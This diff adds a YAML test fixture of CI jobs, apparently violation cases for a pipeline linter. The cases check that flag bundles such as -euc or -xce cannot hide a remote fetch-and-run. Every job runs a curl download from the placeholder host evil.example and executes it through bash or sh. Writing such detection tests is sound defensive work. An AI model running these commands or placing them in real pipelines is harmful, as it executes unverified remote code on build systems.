@@ -1,0 +1,49 @@
+# violation: shell flags between the interpreter and `-c` must not evade
+# the command-substitution rule, mirroring the process-substitution rule's
+# own `(?:-\S+\s+)*` allowance. Both the single-letter-bundle form and the
+# hardened-CI `-euo pipefail` wrapper are unverified network fetches.
+flags_short:
+  image: alpine:3.19
+  script:
+    - bash -eu -c "$(curl -fsSL https://evil.example/i.sh)"
+
+flags_long:
+  image: alpine:3.19
+  script:
+    - bash -euo pipefail -c "$(curl -fsSL https://evil.example/i.sh)"
+
+# A single bundled short-flag token whose LAST letter is `c` is the same
+# invocation as a standalone -c: `bash -euc ...` is `bash -eu -c ...`
+# written as one token, an extremely common hardened-CI idiom.
+flags_bundled:
+  image: alpine:3.19
+  script:
+    - bash -euc "$(curl -fsSL https://evil.example/i.sh)"
+
+# c need not be the only trailing letter, and the bundle need not start
+# right after the dash with e/u: any letters before a trailing c count.
+flags_bundled_trailing_c:
+  image: alpine:3.19
+  script:
+    - sh -xc "$(curl -fsSL https://evil.example/i.sh)"
+
+# c need not be the TRAILING letter either. bash/zsh/sh/dash/ksh read
+# their invocation flags one character at a time and set the pending-
+# command state on any `c` in the bundle, reading the command string
+# from the next operand regardless of what comes after the `c` in the
+# same token: `-ce`, `-uce` and `-xce` all run their substitution exactly
+# like a trailing `-c` does.
+flags_bundled_c_not_trailing:
+  image: alpine:3.19
+  script:
+    - bash -ce "$(curl -fsSL https://evil.example/i.sh)"
+
+flags_bundled_u_then_c_then_e:
+  image: alpine:3.19
+  script:
+    - bash -uce "$(curl -fsSL https://evil.example/i.sh)"
+
+flags_bundled_x_then_c_then_e:
+  image: alpine:3.19
+  script:
+    - sh -xce "$(curl -fsSL https://evil.example/i.sh)"
